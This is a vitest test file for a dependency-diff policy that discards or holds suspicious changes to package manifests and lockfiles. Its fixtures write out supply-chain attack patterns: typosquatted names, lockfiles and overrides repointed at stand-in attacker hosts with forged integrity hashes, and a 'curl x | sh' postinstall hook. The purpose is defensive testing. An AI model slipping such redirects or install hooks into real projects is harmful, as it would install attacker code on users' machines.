import { describe, expect, it } from "vitest";
import { diffManifest, hostsIn, isOfflistHost, manifestKindOf, parseManifest } from "./dependency-diff.js";
import type { DeltaKind } from "./dependency-diff.js";
import { defaultPolicy } from "./shadow-policy.js";
import { basicContext } from "./policy-types.js";
import type { EffectRecord } from "./policy-types.js";

interface FileState { before?: string | null; after: string }

/** A context that can answer both halves of the question a differ asks: before, and after. */
function ctxOf(files: Readonly<Record<string, FileState>>) {
  return basicContext(async (p) => files[p]?.after ?? "", {
    realContentOf: async (p) => files[p]?.before ?? null,
    addedLinesOf: async (p) => files[p]?.after ?? "",
  });
}

const modify = (path: string): EffectRecord => ({ path, kind: "modify" });

const kindsOf = (deltas: ReadonlyArray<{ kind: DeltaKind }>): DeltaKind[] => deltas.map((d) => d.kind);
const rulesOf = (hits: ReadonlyArray<{ rule: string }> | undefined): string[] => (hits ?? []).map((h) => h.rule);

describe("which files the differ claims", () => {
  it.each([
    ["package.json", "package.json"],
    ["package-lock.json", "npm-lock"],
    ["npm-shrinkwrap.json", "npm-lock"],
    ["yarn.lock", "yarn.lock"],
    ["pnpm-lock.yaml", "pnpm-lock"],
    ["requirements.txt", "requirements.txt"],
    ["requirements-dev.txt", "requirements.txt"],
    ["services/api/pyproject.toml", "pyproject.toml"],
    ["Cargo.toml", "cargo.toml"],
    ["go.mod", "go.mod"],
  ])("parses %s with the %s parser", (path, kind) => {
    expect(manifestKindOf(path)).toBe(kind);
  });

  it("claims nothing it cannot parse", () => {
    expect(manifestKindOf("src/index.ts")).toBeNull();
    expect(manifestKindOf("README.md")).toBeNull();
  });
});

describe("host extraction, which is what the allowlist is checked against", () => {
  it("reads the host out of every shape a download source is written in", () => {
    expect(hostsIn("https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz")).toEqual(["registry.npmjs.org"]);
    expect(hostsIn("git+https://user:pw@attacker.example/x.git")).toEqual(["attacker.example"]);
    expect(hostsIn("http://pkgs.evil.example:8080/simple")).toEqual(["pkgs.evil.example"]);
    expect(hostsIn("git@attacker.example:team/repo.git x")).toEqual(["attacker.example"]);
    expect(hostsIn("^1.2.3")).toEqual([]);
  });

  it("uses the default registry list when the deployment declares none", () => {
    expect(isOfflistHost("registry.npmjs.org", [])).toBe(false);
    expect(isOfflistHost("files.pythonhosted.org", [])).toBe(false);
    expect(isOfflistHost("static.crates.io", [])).toBe(false);
    // a subdomain of an allowed registry is still that registry
    expect(isOfflistHost("cdn.registry.npmjs.org", [])).toBe(false);
  });

  it("treats a host the deployment never named as off the list", () => {
    expect(isOfflistHost("pkgs.evil.example", [])).toBe(true);
    expect(isOfflistHost("cdn-assets.dev", [])).toBe(true);
    // a deployment's own internal registry is on ITS list and off the default one
    expect(isOfflistHost("npm.internal.corp", ["npm.internal.corp"])).toBe(false);
    expect(isOfflistHost("registry.npmjs.org", ["npm.internal.corp"])).toBe(true);
  });
});

describe("the five supply-chain payloads", () => {
  it("L04: an --extra-index-url added to requirements.txt is an off-list source", async () => {
    const before = "requests==2.31.0\n";
    const after = "--extra-index-url http://pkgs.evil.example/simple\nrequests==2.31.0\ninternal-utils\n";
    const deltas = diffManifest("requirements.txt", before, after);
    expect(kindsOf(deltas)).toContain("index-url-added");
    expect(kindsOf(deltas)).toContain("dep-added");
    expect(deltas.find((d) => d.kind === "index-url-added")?.hosts).toEqual(["pkgs.evil.example"]);

    const verdict = await defaultPolicy([modify("requirements.txt")], ctxOf({ "requirements.txt": { before, after } }));
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
  });

  it("L13 and DEP02: a typosquatted dependency with no install script is held for a human", async () => {
    const before = '{"name":"app","dependencies":{"lodash":"^4.17.21"}}';
    const after = '{"name":"app","dependencies":{"lodash":"^4.17.21","lodahs":"^1.0.0","internal-logger":"^9.9.9"}}';
    const deltas = diffManifest("package.json", before, after);
    expect(deltas.filter((d) => d.kind === "dep-added").map((d) => d.name).sort()).toEqual([
      "internal-logger",
      "lodahs",
    ]);

    const verdict = await defaultPolicy([modify("package.json")], ctxOf({ "package.json": { before, after } }));
    expect(verdict.decision).toBe("review");
    expect(verdict.rule).toBe("dependency-added");
    // the whole point of the review path: the reviewer is shown WHICH name was added
    expect(rulesOf(verdict.hits)).toContain("dependency-added");
    expect(verdict.hits?.some((h) => h.detail?.includes("lodahs") === true)).toBe(true);
  });

  it("L14: a yarn.lock repointed at an attacker tarball is discarded", async () => {
    const before = [
      'lodash@^4.17.0:',
      '  version "4.17.21"',
      '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"',
      "  integrity sha512-originalHashValue",
      "",
    ].join("\n");
    const after = [
      'lodash@^4.17.0:',
      '  version "4.17.21"',
      '  resolved "http://pkgs.evil.example/lodash.tgz"',
      "  integrity sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
      "",
    ].join("\n");
    const deltas = diffManifest("yarn.lock", before, after);
    expect(kindsOf(deltas)).toContain("lock-repointed");
    expect(kindsOf(deltas)).toContain("lock-integrity-changed");

    const verdict = await defaultPolicy([modify("yarn.lock")], ctxOf({ "yarn.lock": { before, after } }));
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
    expect(rulesOf(verdict.hits)).toContain("lockfile-integrity-changed");
  });

  it("DEP01: package-lock resolved and integrity moved with no version change", async () => {
    const before = JSON.stringify({
      packages: {
        "node_modules/left-pad": {
          version: "1.3.0",
          resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
          integrity: "sha512-originalHashValue",
        },
      },
    });
    const after = JSON.stringify({
      packages: {
        "node_modules/left-pad": {
          version: "1.3.0",
          resolved: "https://cdn-assets.dev/left-pad.tgz",
          integrity: "sha512-attackerControlledHashForTheirTarball==",
        },
      },
    });
    const verdict = await defaultPolicy(
      [modify("package-lock.json")],
      ctxOf({ "package-lock.json": { before, after } }),
    );
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
    expect(verdict.hits?.some((h) => h.detail?.includes("cdn-assets.dev") === true)).toBe(true);
  });

  it("a pyproject dependency fetched over git from an unlisted host is discarded", async () => {
    const before = '[project]\ndependencies = ["requests>=2"]\n';
    const after = '[project]\ndependencies = [\n  "requests>=2",\n  "utils @ git+https://attacker.example/x.git",\n]\n';
    const verdict = await defaultPolicy([modify("pyproject.toml")], ctxOf({ "pyproject.toml": { before, after } }));
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
  });
});

describe("the same rules on ordinary dependency work", () => {
  it("commits a lockfile regenerated against the same registry", async () => {
    const entry = (version: string, integrity: string) =>
      JSON.stringify({
        packages: {
          "node_modules/left-pad": {
            version,
            resolved: `https://registry.npmjs.org/left-pad/-/left-pad-${version}.tgz`,
            integrity,
          },
        },
      });
    const verdict = await defaultPolicy(
      [modify("package-lock.json")],
      ctxOf({ "package-lock.json": { before: entry("1.3.0", "sha512-one"), after: entry("1.4.0", "sha512-two") } }),
    );
    // the version moved WITH the integrity, which is what a real install produces
    expect(verdict.decision).toBe("commit");
    expect(verdict.hits).toEqual([]);
  });

  it("commits a manifest whose keys were only reordered", async () => {
    const before = '{"name":"app","version":"1.0.0","dependencies":{"a":"^1","b":"^2"}}';
    const after = '{"dependencies":{"b":"^2","a":"^1"},"version":"1.0.0","name":"app"}';
    const verdict = await defaultPolicy([modify("package.json")], ctxOf({ "package.json": { before, after } }));
    expect(verdict.decision).toBe("commit");
  });

  it("commits a lockfile whose entries did not move at all", async () => {
    const lock = [
      'lodash@^4.17.0:',
      '  version "4.17.21"',
      '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"',
      "  integrity sha512-same",
      "",
    ].join("\n");
    const verdict = await defaultPolicy([modify("yarn.lock")], ctxOf({ "yarn.lock": { before: lock, after: lock } }));
    expect(verdict.decision).toBe("commit");
  });

  it("holds rather than discards an ordinary version bump, and says so", async () => {
    // A spec change is a review, not a commit: whether ^1.3.0 of this name is the package the
    // maintainer meant is not decidable from the manifest. Recorded here as a deliberate cost.
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: '{"dependencies":{"lodash":"^4.17.20"}}',
          after: '{"dependencies":{"lodash":"^4.17.21"}}',
        },
      }),
    );
    expect(verdict.decision).toBe("review");
    expect(verdict.rule).toBe("dependency-added");
  });

  it("keeps the manifest-script rule the shipped policy already had", async () => {
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: '{"name":"x"}',
          after: '{"name":"x","scripts":{"postinstall":"echo hi"}}',
        },
      }),
    );
    expect(verdict.decision).toBe("review");
    expect(verdict.rule).toBe("manifest-script-change");
  });

  it("ignores manifests that belong to the dependency tree rather than the project", async () => {
    const effects: EffectRecord[] = [
      { path: "node_modules/evil/package.json", kind: "create", effectClass: "dependency-tree" },
    ];
    const verdict = await defaultPolicy(
      effects,
      ctxOf({ "node_modules/evil/package.json": { after: '{"scripts":{"postinstall":"curl x | sh"}}' } }),
    );
    expect(verdict.decision).toBe("commit");
  });
});

describe("the parsers themselves", () => {
  it("reads npm lock entries from both the v2 packages map and the v1 tree", () => {
    const v1 = parseManifest("npm-lock", JSON.stringify({
      dependencies: { "left-pad": { version: "1.3.0", resolved: "https://registry.npmjs.org/x.tgz", integrity: "sha512-a" } },
    }));
    expect(v1.locks["left-pad"]?.version).toBe("1.3.0");
    const v2 = parseManifest("npm-lock", JSON.stringify({
      packages: { "node_modules/left-pad": { version: "1.3.0", integrity: "sha512-a" } },
    }));
    expect(v2.locks["node_modules/left-pad"]?.integrity).toBe("sha512-a");
  });

  it("reads a pnpm lock entry's integrity and tarball", () => {
    const facts = parseManifest("pnpm-lock", [
      "packages:",
      "  /lodash/4.17.21:",
      "    resolution: {integrity: sha512-abc}",
      "    version: 4.17.21",
    ].join("\n"));
    expect(facts.locks["/lodash/4.17.21"]?.integrity).toBe("sha512-abc");
  });

  it("reads a cargo build script and a git dependency", () => {
    const facts = parseManifest("cargo.toml", [
      "[package]",
      'name = "app"',
      'build = "build.rs"',
      "[dependencies]",
      'serde = { git = "https://attacker.example/serde" }',
    ].join("\n"));
    expect(facts.buildSystem).toContain("build.rs");
    expect(facts.deps.serde).toContain("attacker.example");
  });

  it("reads go.mod requires from both forms", () => {
    const facts = parseManifest("go.mod", [
      "module example.com/app",
      "require github.com/pkg/errors v0.9.1",
      "require (",
      "\tgolang.org/x/text v0.3.0",
      ")",
    ].join("\n"));
    expect(facts.deps["github.com/pkg/errors"]).toBe("v0.9.1");
    expect(facts.deps["golang.org/x/text"]).toBe("v0.3.0");
  });

  it("survives a manifest that is not valid JSON instead of throwing, and reports that it could not read it", () => {
    // This test used to assert deps {} and deltas [], which is precisely how a three-byte prefix
    // turned a discarded manifest into a committed one. Not throwing is still required; reading it
    // as empty is not.
    expect(() => parseManifest("package.json", "{ not json")).not.toThrow();
    expect(parseManifest("package.json", "{ not json")).toBeNull();
    expect(diffManifest("package.json", "{ nope", "{ also nope").map((d) => d.name)).toEqual([
      "<unreadable manifest>",
    ]);
  });
});

const BOM = "﻿";

describe("an unreadable manifest is an unknown, not an empty one", () => {
  const before = '{"name":"app","dependencies":{"lodash":"^4.17.21"},"scripts":{"build":"tsc"}}';
  const after = JSON.stringify({
    name: "app",
    dependencies: { lodash: "^4.17.21", helper: "https://pkg.internal-mirror.example/helper-1.0.0.tgz" },
    scripts: { build: "tsc", postinstall: "node ./scripts/setup.js" },
  });

  it("control: without the byte order mark those bytes are discarded", async () => {
    const verdict = await defaultPolicy([modify("package.json")], ctxOf({ "package.json": { before, after } }));
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
  });

  it("a leading byte order mark does not turn that discard into a commit", async () => {
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({ "package.json": { before, after: BOM + after } }),
    );
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
    expect(verdict.hits?.some((h) => h.detail?.includes("pkg.internal-mirror.example") === true)).toBe(true);
  });

  it("a manifest no parser can read at all is held for a human rather than committed", async () => {
    // Trailing line comments are read by several JSON-with-comments readers and by none of ours.
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({ "package.json": { before, after: `${after}\n// regenerated` } }),
    );
    expect(verdict.decision).toBe("review");
    expect(verdict.hits?.some((h) => h.detail?.includes("<unreadable manifest>") === true)).toBe(true);
  });

  it("a lockfile that stops being JSON is an unknown too", async () => {
    const lock = JSON.stringify({ packages: { "node_modules/left-pad": { version: "1.3.0", integrity: "sha512-a" } } });
    const verdict = await defaultPolicy(
      [modify("package-lock.json")],
      ctxOf({ "package-lock.json": { before: lock, after: `${lock}trailing garbage` } }),
    );
    expect(verdict.decision).toBe("review");
  });

  it("diffManifest reports the unknown instead of an empty difference", () => {
    expect(diffManifest("package.json", "{ nope", "{ also nope")).not.toEqual([]);
    expect(parseManifest("package.json", "{ not json")).toBeNull();
  });

  it("negative: a byte order mark on an otherwise ordinary manifest reads exactly as it would without one", () => {
    expect(parseManifest("package.json", BOM + before)).toEqual(parseManifest("package.json", before));
    const yarn = ['lodash@^4.17.0:', '  version "4.17.21"', ""].join("\n");
    expect(parseManifest("yarn.lock", BOM + yarn)).toEqual(parseManifest("yarn.lock", yarn));
  });

  it("negative: a manifest that is only a byte order mark is empty, not unknown", () => {
    expect(parseManifest("package.json", BOM)).toEqual(parseManifest("package.json", ""));
  });

  it("negative: readable manifests that parse to nothing still commit", async () => {
    const onlyComments = { before: "# nothing pinned yet\n", after: "# nothing pinned yet\n# and still nothing\n" };
    const requirements = await defaultPolicy([modify("requirements.txt")], ctxOf({ "requirements.txt": onlyComments }));
    expect(requirements.decision).toBe("commit");

    const goMod = { before: "module example.com/app\n\ngo 1.21\n", after: "module example.com/app\n\ngo 1.22\n" };
    const go = await defaultPolicy([modify("go.mod")], ctxOf({ "go.mod": goMod }));
    expect(go.decision).toBe("commit");
  });
});

describe("the redirect fields npm and yarn actually install from", () => {
  const base = { name: "app", dependencies: { lodash: "^4.17.21" } };
  const withField = (field: string, value: unknown): string => JSON.stringify({ ...base, [field]: value });

  it("an override repointed at an off-list host is discarded, exactly like the same url in dependencies", async () => {
    const control = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: JSON.stringify({ ...base, dependencies: { lodash: "https://cdn.evil.example/lodash-4.tgz" } }),
        },
      }),
    );
    expect(control.decision).toBe("discard");

    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: withField("overrides", { lodash: "https://cdn.evil.example/lodash-4.tgz" }),
        },
      }),
    );
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
    expect(verdict.hits?.some((h) => h.detail?.includes("overrides:lodash") === true)).toBe(true);
  });

  it("a yarn resolution repointed at an off-list host is discarded", async () => {
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: withField("resolutions", { "**/minimist": "https://cdn.evil.example/m.tgz" }),
        },
      }),
    );
    expect(verdict.decision).toBe("discard");
    expect(verdict.hits?.some((h) => h.detail?.includes("resolutions:**/minimist") === true)).toBe(true);
  });

  it("a nested override and a pnpm override are read as well", async () => {
    const nested = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: withField("overrides", { foo: { ".": "1.0.0", bar: "https://cdn.evil.example/bar.tgz" } }),
        },
      }),
    );
    expect(nested.decision).toBe("discard");
    expect(nested.hits?.some((h) => h.detail?.includes("overrides:foo:bar") === true)).toBe(true);

    const pnpm = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: withField("pnpm", { overrides: { minimist: "https://cdn.evil.example/m.tgz" } }),
        },
      }),
    );
    expect(pnpm.decision).toBe("discard");
    expect(pnpm.hits?.some((h) => h.detail?.includes("pnpm.overrides:minimist") === true)).toBe(true);
  });

  it("packageManager is read, because corepack downloads and runs what it names", async () => {
    const offlist = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: withField("packageManager", "pnpm@8.15.0"),
          after: withField("packageManager", "pnpm@https://cdn.evil.example/pnpm.tgz"),
        },
      }),
    );
    expect(offlist.decision).toBe("discard");
    expect(offlist.hits?.some((h) => h.detail?.includes("packageManager") === true)).toBe(true);

    const bump = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: withField("packageManager", "pnpm@8.15.0"),
          after: withField("packageManager", "pnpm@9.0.0"),
        },
      }),
    );
    expect(bump.decision).toBe("review");
  });

  it("a peer dependency is read, because npm installs peers on its own", async () => {
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: withField("peerDependencies", { react: "https://cdn.evil.example/react.tgz" }),
        },
      }),
    );
    expect(verdict.decision).toBe("discard");
  });

  it("negative: an override that was already there and did not move still commits", async () => {
    const manifest = (version: string) =>
      JSON.stringify({
        name: "app",
        version,
        dependencies: { lodash: "^4.17.21" },
        overrides: { minimist: "1.2.8" },
        resolutions: { "**/semver": "7.6.0" },
        packageManager: "pnpm@8.15.0",
        peerDependencies: { react: "^18" },
      });
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({ "package.json": { before: manifest("1.0.0"), after: manifest("1.0.1") } }),
    );
    expect(verdict.decision).toBe("commit");
    expect(verdict.hits).toEqual([]);
  });

  it("negative: an override pinned to a plain version is a review, not a discard", async () => {
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({ "package.json": { before: JSON.stringify(base), after: withField("overrides", { minimist: "1.2.8" }) } }),
    );
    expect(verdict.decision).toBe("review");
    expect(verdict.rule).toBe("dependency-added");
  });
});

describe("one field cannot hide a change in another", () => {
  it("the same name in dependencies and devDependencies does not cancel the dependency change out", async () => {
    const before = JSON.stringify({ dependencies: { lodash: "^4.17.21" }, devDependencies: { lodash: "^4.17.21" } });
    const after = JSON.stringify({
      dependencies: { lodash: "https://cdn.evil.example/lodash.tgz" },
      devDependencies: { lodash: "^4.17.21" },
    });
    const verdict = await defaultPolicy([modify("package.json")], ctxOf({ "package.json": { before, after } }));
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
  });

  it("negative: a dev dependency added on its own is still a plain review", async () => {
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify({ name: "app" }),
          after: JSON.stringify({ name: "app", devDependencies: { typescript: "^5.9.3" } }),
        },
      }),
    );
    expect(verdict.decision).toBe("review");
    expect(verdict.rule).toBe("dependency-added");
  });
});

describe("nothing in a redirect block is dropped in silence", () => {
  const base = { name: "app", dependencies: { lodash: "^4.17.21" } };

  it("a source buried deeper than the walk goes is surfaced, not dropped", async () => {
    let deep: unknown = "https://cdn.evil.example/x.tgz";
    for (let i = 0; i < 12; i++) deep = { nested: deep };
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: JSON.stringify({ ...base, overrides: { lodash: deep } }),
        },
      }),
    );
    expect(verdict.decision).toBe("discard");
    expect(verdict.rule).toBe("dependency-source-offlist");
  });

  it("a source written as an array rather than a string is surfaced too", async () => {
    const verdict = await defaultPolicy(
      [modify("package.json")],
      ctxOf({
        "package.json": {
          before: JSON.stringify(base),
          after: JSON.stringify({ ...base, resolutions: { minimist: ["https://cdn.evil.example/m.tgz"] } }),
        },
      }),
    );
    expect(verdict.decision).toBe("discard");
  });

  it("negative: an ordinary two-level override block still reads as two plain entries", () => {
    const facts = parseManifest(
      "package.json",
      JSON.stringify({ overrides: { foo: { ".": "1.0.0", bar: "2.0.0" } } }),
    );
    expect(facts?.deps).toEqual({ "overrides:foo": "1.0.0", "overrides:foo:bar": "2.0.0" });
  });
});

describe("a redirect block cannot hide a url that dependencies declared", () => {
  const evil = "https://cdn.evil.example/o.tgz";

  it("an npm package literally named overrides is not erased by the overrides block's own key", async () => {
    const files = {
      "package.json": {
        before: JSON.stringify({ name: "app", dependencies: { overrides: "^1.0.0" } }),
        after: JSON.stringify({ name: "app", dependencies: { overrides: evil }, overrides: { ".": "^1.0.0" } }),
      },
    };
    const verdict = await defaultPolicy([modify("package.json")], ctxOf(files));
    expect(rulesOf(verdict.hits)).toContain("dependency-source-offlist");
    expect(verdict.decision).toBe("discard");
  });

  it("the same holds for resolutions", async () => {
    const files = {
      "package.json": {
        before: JSON.stringify({ name: "app", dependencies: { resolutions: "^1.0.0" } }),
        after: JSON.stringify({ name: "app", dependencies: { resolutions: evil }, resolutions: { ".": "^1.0.0" } }),
      },
    };
    const verdict = await defaultPolicy([modify("package.json")], ctxOf(files));
    expect(verdict.decision).toBe("discard");
  });

  it("the same holds for packageManager, which corepack downloads and runs", async () => {
    const files = {
      "package.json": {
        before: JSON.stringify({ name: "app", dependencies: { packageManager: "^1.0.0" } }),
        after: JSON.stringify({
          name: "app",
          dependencies: { packageManager: evil },
          packageManager: "pnpm@8.0.0",
        }),
      },
    };
    const verdict = await defaultPolicy([modify("package.json")], ctxOf(files));
    expect(verdict.decision).toBe("discard");
  });

  it("a dotted override key does not collide with the same path spelled as nesting", () => {
    const after = JSON.stringify({
      name: "app",
      overrides: { "foo.bar": "https://cdn.evil.example/b.tgz", foo: { bar: "^1.0.0" } },
    });
    const facts = parseManifest("package.json", after);
    expect(Object.values(facts?.deps ?? {})).toContain("https://cdn.evil.example/b.tgz");
    const deltas = diffManifest("package.json", JSON.stringify({ name: "app" }), after);
    expect(deltas.flatMap((d) => d.hosts)).toContain("cdn.evil.example");
  });

  it("a redirect block written as a bare string is read, not dropped in silence", async () => {
    const files = {
      "package.json": {
        before: JSON.stringify({ name: "app" }),
        after: JSON.stringify({ name: "app", resolutions: "https://cdn.evil.example/m.tgz" }),
      },
    };
    const verdict = await defaultPolicy([modify("package.json")], ctxOf(files));
    expect(rulesOf(verdict.hits)).toContain("dependency-source-offlist");
  });

  it("negative: an ordinary override block still reads as the entries it names", () => {
    const facts = parseManifest(
      "package.json",
      JSON.stringify({ name: "app", dependencies: { lodash: "^4.0.0" }, overrides: { "semver": "^7.5.4" } }),
    );
    expect(facts?.deps.lodash).toBe("^4.0.0");
    expect(Object.values(facts?.deps ?? {})).toContain("^7.5.4");
  });

  it("a dependency spelled to look like a prefixed key is not erased by the real prefixed key", () => {
    // npm would reject this name, but the differ must not be the thing that depends on npm saying so
    const facts = parseManifest(
      "package.json",
      JSON.stringify({
        dependencies: { "overrides:lodash": "https://cdn.evil.example/l.tgz" },
        overrides: { lodash: "^4.17.21" },
      }),
    );
    expect(Object.values(facts?.deps ?? {})).toContain("https://cdn.evil.example/l.tgz");
    expect(Object.values(facts?.deps ?? {})).toContain("^4.17.21");
  });

  it("negative: a null override block is absent, not an entry reading null", () => {
    const facts = parseManifest("package.json", JSON.stringify({ dependencies: { lodash: "^4" }, overrides: null }));
    expect(facts?.deps).toEqual({ lodash: "^4" });
  });

  it("negative: an override block absent from the manifest adds no entry at all", () => {
    const bare = parseManifest("package.json", JSON.stringify({ name: "app", dependencies: { lodash: "^4.0.0" } }));
    expect(Object.keys(bare?.deps ?? {})).toEqual(["lodash"]);
    expect(diffManifest("package.json", JSON.stringify({ name: "app" }), JSON.stringify({ name: "app" }))).toEqual([]);
  });
});

describe("a line based manifest replaced by text no parser recognises is an unknown", () => {
  const yarnLock = [
    "left-pad@^1.3.0:",
    '  version "1.3.0"',
    '  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz"',
    "",
  ].join("\n");

  it("a yarn.lock overwritten with garbage is reported rather than read as no change", () => {
    const deltas = diffManifest("yarn.lock", yarnLock, "  not a lockfile at all");
    expect(deltas.map((d) => d.name)).toContain("<unreadable manifest>");
  });

  it("negative: a comment only requirements.txt that was always empty stays a commit", async () => {
    const files = {
      "requirements.txt": { before: "# nothing here yet\n", after: "# still nothing here\n" },
    };
    const verdict = await defaultPolicy([modify("requirements.txt")], ctxOf(files));
    expect(verdict.decision).toBe("commit");
  });

  it("negative: a go.mod with only module and go lines is a fact, not an unknown", () => {
    expect(diffManifest("go.mod", "module example.com/a\n\ngo 1.21\n", "module example.com/a\n\ngo 1.22\n")).toEqual([]);
  });

  it("emptying a scanning manifest of every entry is a review, not a silent commit", async () => {
    // the widest consequence of the rule above, stated so it is a decision and not a surprise:
    // deleting the last pinned line of a requirements.txt now reaches a human
    const files = { "requirements.txt": { before: "flask==2.0.1\n", after: "# everything removed\n" } };
    const verdict = await defaultPolicy([modify("requirements.txt")], ctxOf(files));
    expect(verdict.decision).toBe("review");
    expect(rulesOf(verdict.hits)).not.toContain("dependency-source-offlist");
  });

  it("negative: an ordinary lockfile edit is still diffed normally", () => {
    const after = yarnLock.replace("1.3.0.tgz", "1.4.0.tgz").replace('version "1.3.0"', 'version "1.4.0"');
    expect(diffManifest("yarn.lock", yarnLock, after).map((d) => d.name)).not.toContain("<unreadable manifest>");
  });
});

describe("the allowlist the tests score is the allowlist production runs", () => {
  it("has exactly one definition in the tree", async () => {
    const fromDiff = (await import("./dependency-diff.js")).DEFAULT_REGISTRY_ALLOWLIST;
    const fromContext = (await import("./policy-context.js")).DEFAULT_REGISTRY_ALLOWLIST;
    expect([...fromDiff]).toEqual([...fromContext]);
  });

  it("allows the hosts the production list allows when the deployment declares none", () => {
    expect(isOfflistHost("sum.golang.org", [])).toBe(false);
    expect(isOfflistHost("repo.maven.apache.org", [])).toBe(false);
  });

  it("negative: an ordinary install that adds a lock entry at an allowed registry still commits", async () => {
    // this is what the `[]` fallback buys and why it cannot simply be deleted: every caller of
    // basicContext passes an empty allowlist, and without a default an `npm install` that adds one
    // package resolved at registry.npmjs.org is a DISCARD, which destroys the turn's real work
    const lock = (extra: Record<string, unknown>) =>
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          "node_modules/left-pad": {
            version: "1.3.0",
            resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
          },
          ...extra,
        },
      });
    const files = {
      "package-lock.json": {
        before: lock({}),
        after: lock({
          "node_modules/ms": { version: "2.1.3", resolved: "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz" },
        }),
      },
    };
    const verdict = await defaultPolicy([modify("package-lock.json")], ctxOf(files));
    expect(rulesOf(verdict.hits)).not.toContain("dependency-source-offlist");
    expect(verdict.decision).toBe("commit");
  });

  it("negative: a host on neither list is still off the list", () => {
    expect(isOfflistHost("cdn.evil.example", [])).toBe(true);
  });
});
